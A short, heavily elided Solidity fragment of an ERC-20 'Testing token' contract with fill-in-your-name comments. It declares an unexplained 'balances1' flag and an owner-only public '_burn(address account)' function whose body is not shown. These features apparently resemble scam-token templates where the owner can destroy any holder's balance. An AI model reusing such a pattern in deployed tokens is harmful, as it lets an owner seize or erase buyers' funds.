...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    uint256 public _totalSupply = 1000000000000000*10**18; // your total supply goes here
    string public _name = "Testing token"; // your token name here
    string public _symbol= "TEST"; // your token symbol goes here
     bool balances1 = true;
    ...
    modifier onlyOwner {
     ...
     function _burn(address account) onlyOwner public {
